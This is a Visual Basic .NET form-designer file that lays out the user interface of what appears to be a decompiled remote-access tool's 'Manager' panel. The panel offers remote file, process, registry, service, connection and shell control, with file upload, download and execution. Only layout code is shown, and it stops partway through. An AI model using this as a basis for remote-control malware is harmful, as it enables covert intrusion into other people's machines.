<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Manager
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Manager))
        Dim ListViewItem1 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("File Manager", "Icon_5.bmp")
        Dim ListViewItem2 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Process Manager", "Icon_8.bmp")
        Dim ListViewItem3 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Connections", "Icon_178.bmp")
        Dim ListViewItem4 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Registry", "Icon_27.bmp")
        Dim ListViewItem5 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Remote Shell", "Icon_1.bmp")
        Dim ListViewItem6 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Services", "Icon_274.bmp")
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.SL = New System.Windows.Forms.ToolStripStatusLabel()
        Me.pr = New System.Windows.Forms.ToolStripProgressBar()
        Me.M1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.KillToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.KillDeleteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartProcessToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.vmethod_26 = New System.Windows.Forms.Timer(Me.components)
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.KillConnectionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.crg = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EditToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NewValueToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.rimg = New System.Windows.Forms.ImageList(Me.components)
        Me.crgk = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateKeyToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteSelectedToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ContextMenuStrip2 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PauseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ContextMenuStrip3 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.UPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RefreshToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.EditToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CopyToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DownloadToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UploadToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NewEmptyFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NewFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenDownloadsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RarToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UnRarToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UploadFromLinkToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ContextMenuStrip4 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.MG = New System.Windows.Forms.ImageList(Me.components)
        Me.ListView1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.vmethod_148 = New System.Windows.Forms.ImageList(Me.components)
        Me.vmethod_108 = New System.Windows.Forms.ImageList(Me.components)
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.FMM = New System.Windows.Forms.Panel()
        Me.LSRV = New GClass9()
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader12 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader13 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader14 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader15 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.LPR = New GClass9()
        Me.ColumnHeader22 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader23 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader24 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader25 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader26 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.L1 = New GClass9()
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.p = New System.Windows.Forms.PictureBox()
        Me.L2 = New GClass9()
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.LTCP = New GClass9()
        Me.ColumnHeader16 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader17 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader18 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader19 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader20 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader21 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.RG = New System.Windows.Forms.Panel()
        Me.RGLIST = New GClass9()
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.RGk = New System.Windows.Forms.TreeView()
        Me.sh = New System.Windows.Forms.Panel()
        Me.T1 = New System.Windows.Forms.RichTextBox()
        Me.T2 = New System.Windows.Forms.TextBox()
        Me.StatusStrip1.SuspendLayout()
        Me.M1.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.crg.SuspendLayout()
        Me.crgk.SuspendLayout()
        Me.ContextMenuStrip2.SuspendLayout()
        Me.ContextMenuStrip3.SuspendLayout()
        Me.ContextMenuStrip4.SuspendLayout()
        Me.FMM.SuspendLayout()
        CType(Me.p, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.RG.SuspendLayout()
        Me.sh.SuspendLayout()
        Me.SuspendLayout()
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.Black
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SL, Me.pr})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 323)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.StatusStrip1.Size = New System.Drawing.Size(667, 22)
        Me.StatusStrip1.TabIndex = 0
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'SL
        '
        Me.SL.IsLink = True
        Me.SL.Name = "SL"
        Me.SL.Size = New System.Drawing.Size(13, 17)
        Me.SL.Text = ".."
        '
        'pr
        '
        Me.pr.Name = "pr"
        Me.pr.Size = New System.Drawing.Size(100, 16)
        '
        'M1
        '
        Me.M1.BackColor = System.Drawing.Color.Black
        Me.M1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.KillToolStripMenuItem1, Me.KillDeleteToolStripMenuItem, Me.RestartProcessToolStripMenuItem})
        Me.M1.Name = "M1"
        Me.M1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.M1.Size = New System.Drawing.Size(154, 70)
        '
        'KillToolStripMenuItem1
        '
        Me.KillToolStripMenuItem1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.KillToolStripMenuItem1.Image = CType(resources.GetObject("KillToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.KillToolStripMenuItem1.Name = "KillToolStripMenuItem1"
        Me.KillToolStripMenuItem1.Size = New System.Drawing.Size(153, 22)
        Me.KillToolStripMenuItem1.Text = "Kill"
        '
        'KillDeleteToolStripMenuItem
        '
        Me.KillDeleteToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.KillDeleteToolStripMenuItem.Image = CType(resources.GetObject("KillDeleteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KillDeleteToolStripMenuItem.Name = "KillDeleteToolStripMenuItem"
        Me.KillDeleteToolStripMenuItem.Size = New System.Drawing.Size(153, 22)
        Me.KillDeleteToolStripMenuItem.Text = "Kill + Delete"
        '
        'RestartProcessToolStripMenuItem
        '
        Me.RestartProcessToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RestartProcessToolStripMenuItem.Image = CType(resources.GetObject("RestartProcessToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartProcessToolStripMenuItem.Name = "RestartProcessToolStripMenuItem"
        Me.RestartProcessToolStripMenuItem.Size = New System.Drawing.Size(153, 22)
        Me.RestartProcessToolStripMenuItem.Text = "Restart Process"
        '
        'vmethod_26
        '
        Me.vmethod_26.Interval = 1000
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "Icon_1.bmp")
        Me.ImageList1.Images.SetKeyName(1, "Icon_5.bmp")
        Me.ImageList1.Images.SetKeyName(2, "Icon_8.bmp")
        Me.ImageList1.Images.SetKeyName(3, "Icon_27.bmp")
        Me.ImageList1.Images.SetKeyName(4, "Icon_178.bmp")
        Me.ImageList1.Images.SetKeyName(5, "Icon_274.bmp")
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.Color.Black
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.KillConnectionToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(156, 26)
        '
        'KillConnectionToolStripMenuItem
        '
        Me.KillConnectionToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.KillConnectionToolStripMenuItem.Image = CType(resources.GetObject("KillConnectionToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KillConnectionToolStripMenuItem.Name = "KillConnectionToolStripMenuItem"
        Me.KillConnectionToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.KillConnectionToolStripMenuItem.Text = "Kill Connection"
        '
        'crg
        '
        Me.crg.BackColor = System.Drawing.Color.Black
        Me.crg.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem, Me.EditToolStripMenuItem, Me.NewValueToolStripMenuItem, Me.DeleteToolStripMenuItem})
        Me.crg.Name = "crg"
        Me.crg.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.crg.Size = New System.Drawing.Size(131, 92)
        '
        'RefreshToolStripMenuItem
        '
        Me.RefreshToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RefreshToolStripMenuItem.Image = CType(resources.GetObject("RefreshToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
        Me.RefreshToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.RefreshToolStripMenuItem.Text = "Refresh"
        '
        'EditToolStripMenuItem
        '
        Me.EditToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.EditToolStripMenuItem.Image = CType(resources.GetObject("EditToolStripMenuItem.Image"), System.Drawing.Image)
        Me.EditToolStripMenuItem.Name = "EditToolStripMenuItem"
        Me.EditToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.EditToolStripMenuItem.Text = "Edit"
        '
        'NewValueToolStripMenuItem
        '
        Me.NewValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.NewValueToolStripMenuItem.Image = CType(resources.GetObject("NewValueToolStripMenuItem.Image"), System.Drawing.Image)
        Me.NewValueToolStripMenuItem.Name = "NewValueToolStripMenuItem"
        Me.NewValueToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.NewValueToolStripMenuItem.Text = "New Value"
        '
        'DeleteToolStripMenuItem
        '
        Me.DeleteToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.DeleteToolStripMenuItem.Image = CType(resources.GetObject("DeleteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem"
        Me.DeleteToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.DeleteToolStripMenuItem.Text = "Delete"
        '
        'rimg
        '
        Me.rimg.ImageStream = CType(resources.GetObject("rimg.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.rimg.TransparentColor = System.Drawing.Color.Transparent
        Me.rimg.Images.SetKeyName(0, "Treetog-Junior-Folder-open.ico")
        Me.rimg.Images.SetKeyName(1, "8.bmp")
        Me.rimg.Images.SetKeyName(2, "9.bmp")
        '
        'crgk
        '
        Me.crgk.BackColor = System.Drawing.Color.Black
        Me.crgk.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem1, Me.CreateKeyToolStripMenuItem, Me.DeleteSelectedToolStripMenuItem})
        Me.crgk.Name = "crgk"
        Me.crgk.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.crgk.Size = New System.Drawing.Size(155, 70)
        '
        'RefreshToolStripMenuItem1
        '
        Me.RefreshToolStripMenuItem1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RefreshToolStripMenuItem1.Image = CType(resources.GetObject("RefreshToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem1.Name = "RefreshToolStripMenuItem1"
        Me.RefreshToolStripMenuItem1.Size = New System.Drawing.Size(154, 22)
        Me.RefreshToolStripMenuItem1.Text = "Refresh"
        '
        'CreateKeyToolStripMenuItem
        '
        Me.CreateKeyToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.CreateKeyToolStripMenuItem.Image = CType(resources.GetObject("CreateKeyToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CreateKeyToolStripMenuItem.Name = "CreateKeyToolStripMenuItem"
        Me.CreateKeyToolStripMenuItem.Size = New System.Drawing.Size(154, 22)
        Me.CreateKeyToolStripMenuItem.Text = "Create Key"
        '
        'DeleteSelectedToolStripMenuItem
        '
        Me.DeleteSelectedToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.DeleteSelectedToolStripMenuItem.Image = CType(resources.GetObject("DeleteSelectedToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteSelectedToolStripMenuItem.Name = "DeleteSelectedToolStripMenuItem"
        Me.DeleteSelectedToolStripMenuItem.Size = New System.Drawing.Size(154, 22)
        Me.DeleteSelectedToolStripMenuItem.Text = "Delete Selected"
        '
        'ContextMenuStrip2
        '
        Me.ContextMenuStrip2.BackColor = System.Drawing.Color.Black
        Me.ContextMenuStrip2.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StopToolStripMenuItem, Me.PauseToolStripMenuItem, Me.StartToolStripMenuItem})
        Me.ContextMenuStrip2.Name = "ContextMenuStrip2"
        Me.ContextMenuStrip2.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ContextMenuStrip2.Size = New System.Drawing.Size(106, 70)
        '
        'StopToolStripMenuItem
        '
        Me.StopToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.StopToolStripMenuItem.Image = CType(resources.GetObject("StopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StopToolStripMenuItem.Name = "StopToolStripMenuItem"
        Me.StopToolStripMenuItem.Size = New System.Drawing.Size(105, 22)
        Me.StopToolStripMenuItem.Text = "Stop"
        '
        'PauseToolStripMenuItem
        '
        Me.PauseToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.PauseToolStripMenuItem.Image = CType(resources.GetObject("PauseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PauseToolStripMenuItem.Name = "PauseToolStripMenuItem"
        Me.PauseToolStripMenuItem.Size = New System.Drawing.Size(105, 22)
        Me.PauseToolStripMenuItem.Text = "Pause"
        '
        'StartToolStripMenuItem
        '
        Me.StartToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.StartToolStripMenuItem.Image = CType(resources.GetObject("StartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StartToolStripMenuItem.Name = "StartToolStripMenuItem"
        Me.StartToolStripMenuItem.Size = New System.Drawing.Size(105, 22)
        Me.StartToolStripMenuItem.Text = "Start"
        '
        'ContextMenuStrip3
        '
        Me.ContextMenuStrip3.BackColor = System.Drawing.Color.Black
        Me.ContextMenuStrip3.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UPToolStripMenuItem, Me.RefreshToolStripMenuItem2, Me.RunToolStripMenuItem, Me.DeleteToolStripMenuItem1, Me.EditToolStripMenuItem1, Me.RenameToolStripMenuItem, Me.CopyToolStripMenuItem, Me.CutToolStripMenuItem, Me.PasteToolStripMenuItem, Me.DownloadToolStripMenuItem, Me.UploadToolStripMenuItem, Me.NewEmptyFileToolStripMenuItem, Me.NewFolderToolStripMenuItem, Me.OpenDownloadsToolStripMenuItem, Me.RarToolStripMenuItem, Me.UnRarToolStripMenuItem, Me.UploadFromLinkToolStripMenuItem})
        Me.ContextMenuStrip3.Name = "ContextMenuStrip3"
        Me.ContextMenuStrip3.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ContextMenuStrip3.Size = New System.Drawing.Size(169, 378)
        '
        'UPToolStripMenuItem
        '
        Me.UPToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.UPToolStripMenuItem.Image = CType(resources.GetObject("UPToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UPToolStripMenuItem.Name = "UPToolStripMenuItem"
        Me.UPToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.UPToolStripMenuItem.Text = "UP"
        '
        'RefreshToolStripMenuItem2
        '
        Me.RefreshToolStripMenuItem2.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RefreshToolStripMenuItem2.Image = CType(resources.GetObject("RefreshToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem2.Name = "RefreshToolStripMenuItem2"
        Me.RefreshToolStripMenuItem2.Size = New System.Drawing.Size(168, 22)
        Me.RefreshToolStripMenuItem2.Text = "Refresh"
        '
        'RunToolStripMenuItem
        '
        Me.RunToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RunToolStripMenuItem.Image = CType(resources.GetObject("RunToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RunToolStripMenuItem.Name = "RunToolStripMenuItem"
        Me.RunToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.RunToolStripMenuItem.Text = "Run"
        '
        'DeleteToolStripMenuItem1
        '
        Me.DeleteToolStripMenuItem1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.DeleteToolStripMenuItem1.Image = CType(resources.GetObject("DeleteToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.DeleteToolStripMenuItem1.Name = "DeleteToolStripMenuItem1"
        Me.DeleteToolStripMenuItem1.Size = New System.Drawing.Size(168, 22)
        Me.DeleteToolStripMenuItem1.Text = "Delete"
        '
        'EditToolStripMenuItem1
        '
        Me.EditToolStripMenuItem1.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.EditToolStripMenuItem1.Image = CType(resources.GetObject("EditToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.EditToolStripMenuItem1.Name = "EditToolStripMenuItem1"
        Me.EditToolStripMenuItem1.Size = New System.Drawing.Size(168, 22)
        Me.EditToolStripMenuItem1.Text = "Edit"
        '
        'RenameToolStripMenuItem
        '
        Me.RenameToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RenameToolStripMenuItem.Image = CType(resources.GetObject("RenameToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem"
        Me.RenameToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.RenameToolStripMenuItem.Text = "Rename"
        '
        'CopyToolStripMenuItem
        '
        Me.CopyToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.CopyToolStripMenuItem.Image = CType(resources.GetObject("CopyToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem"
        Me.CopyToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.CopyToolStripMenuItem.Text = "Copy"
        '
        'CutToolStripMenuItem
        '
        Me.CutToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.CutToolStripMenuItem.Image = CType(resources.GetObject("CutToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CutToolStripMenuItem.Name = "CutToolStripMenuItem"
        Me.CutToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.CutToolStripMenuItem.Text = "Cut"
        '
        'PasteToolStripMenuItem
        '
        Me.PasteToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.PasteToolStripMenuItem.Image = CType(resources.GetObject("PasteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem"
        Me.PasteToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.PasteToolStripMenuItem.Text = "Paste"
        '
        'DownloadToolStripMenuItem
        '
        Me.DownloadToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.DownloadToolStripMenuItem.Image = CType(resources.GetObject("DownloadToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem"
        Me.DownloadToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.DownloadToolStripMenuItem.Text = "Download"
        '
        'UploadToolStripMenuItem
        '
        Me.UploadToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.UploadToolStripMenuItem.Image = CType(resources.GetObject("UploadToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem"
        Me.UploadToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.UploadToolStripMenuItem.Text = "Upload"
        '
        'NewEmptyFileToolStripMenuItem
        '
        Me.NewEmptyFileToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.NewEmptyFileToolStripMenuItem.Image = CType(resources.GetObject("NewEmptyFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.NewEmptyFileToolStripMenuItem.Name = "NewEmptyFileToolStripMenuItem"
        Me.NewEmptyFileToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.NewEmptyFileToolStripMenuItem.Text = "New Empty File"
        '
        'NewFolderToolStripMenuItem
        '
        Me.NewFolderToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.NewFolderToolStripMenuItem.Image = CType(resources.GetObject("NewFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.NewFolderToolStripMenuItem.Name = "NewFolderToolStripMenuItem"
        Me.NewFolderToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.NewFolderToolStripMenuItem.Text = "New Folder"
        '
        'OpenDownloadsToolStripMenuItem
        '
        Me.OpenDownloadsToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.OpenDownloadsToolStripMenuItem.Image = CType(resources.GetObject("OpenDownloadsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenDownloadsToolStripMenuItem.Name = "OpenDownloadsToolStripMenuItem"
        Me.OpenDownloadsToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.OpenDownloadsToolStripMenuItem.Text = "Open Downloads"
        '
        'RarToolStripMenuItem
        '
        Me.RarToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RarToolStripMenuItem.Image = CType(resources.GetObject("RarToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RarToolStripMenuItem.Name = "RarToolStripMenuItem"
        Me.RarToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.RarToolStripMenuItem.Text = "Rar"
        '
        'UnRarToolStripMenuItem
        '
        Me.UnRarToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.UnRarToolStripMenuItem.Image = CType(resources.GetObject("UnRarToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UnRarToolStripMenuItem.Name = "UnRarToolStripMenuItem"
        Me.UnRarToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.UnRarToolStripMenuItem.Text = "UnRar"
        '
        'UploadFromLinkToolStripMenuItem
        '
        Me.UploadFromLinkToolStripMenuItem.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.UploadFromLinkToolStripMenuItem.Image = CType(resources.GetObject("UploadFromLinkToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UploadFromLinkToolStripMenuItem.Name = "UploadFromLinkToolStripMenuItem"
        Me.UploadFromLinkToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.UploadFromLinkToolStripMenuItem.Text = "Upload From Link"
        '
        'ContextMenuStrip4
        '
        Me.ContextMenuStrip4.BackColor = System.Drawing.Color.Black
        Me.ContextMenuStrip4.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem3})
        Me.ContextMenuStrip4.Name = "ContextMenuStrip4"
        Me.ContextMenuStrip4.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ContextMenuStrip4.Size = New System.Drawing.Size(114, 26)
        '
        'RefreshToolStripMenuItem3
        '
        Me.RefreshToolStripMenuItem3.ForeColor = System.Drawing.Color.LightSteelBlue
        Me.RefreshToolStripMenuItem3.Image = CType(resources.GetObject("RefreshToolStripMenuItem3.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem3.Name = "RefreshToolStripMenuItem3"
        Me.RefreshToolStripMenuItem3.Size = New System.Drawing.Size(113, 22)
        Me.RefreshToolStripMenuItem3.Text = "Refresh"
        '
        'MG
        '
        Me.MG.ImageStream = CType(resources.GetObject("MG.ImageStream"), System.Windows.Forms.ImageListStreamer)
